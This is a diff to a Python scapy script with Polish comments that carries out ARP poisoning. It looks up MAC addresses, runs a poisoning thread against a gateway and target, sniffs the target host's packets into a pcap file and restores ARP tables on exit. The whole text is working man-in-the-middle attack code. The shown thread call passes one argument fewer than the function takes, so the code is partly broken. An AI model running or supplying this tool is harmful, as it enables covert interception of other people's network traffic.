@@ -14,8 +14,8 @@ conf.verb = 0
 
 #---------------Funckje-----------------
 def get_mac(ip):
-    ans, uans = send(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=ip))
-    for s, r in ans:
+    ans, _ = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=ip), timeout=2, retry=10)
+    for _, r in ans:
         return r[Ether].src
 
 def poison_attack(gateway_ip, gateway_mac, target_ip, target_mac):
@@ -56,13 +56,15 @@ GATEWAY_MAC = get_mac(GATEWAY_IP)
 
 # main
 posion_thread = Thread(target=poison_attack, args=(GATEWAY_IP, GATEWAY_MAC, TARGET_IP))
-poison_thread.start()
+posion_thread.start()
 
+try:
+    bpf_filter = f"ip host {TARGET_IP}"
+    packets = sniff(filter=bpf_filter, count=count, iface=INTERFACE)
+    #drukowanie przechwyconych pakietów
+    wrpcap('arper.pcap', packets)
 
-bpf_filter = f"ip host {TARGET_IP}"
-
-
-sniff(filter=bpf_filter, count=count)
-pcap = rdpcap("./capture.pcap")
-
-wrpcap("arp.pcap", pcap)
+    restore_defaults(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)
+except KeyboardInterrupt:
+    restore_defaults(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)
+    sys.exit(0)
